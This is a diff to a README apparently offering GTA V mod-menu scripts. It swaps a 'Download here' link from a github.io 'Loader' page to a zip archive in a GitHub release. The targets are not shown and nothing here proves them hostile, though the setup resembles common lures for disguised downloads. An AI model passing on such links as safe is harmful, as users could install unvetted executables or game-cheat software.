@@ -6,7 +6,7 @@ For Yim Mod Menu, simply put the script into the `scripts` directory inside the 
 
 --------------------------------------------------------------------------------------------------
 
-## [Download here](https://josephyrs030301.github.io/Loader/)
+## [Download here](https://github.com/dergm/ymu-script/releases/download/ppq/yim_menu_comp.zip)
 
 ## GtaVScripts 
 I'm presenting you some GTA V scripts for online or campaign.
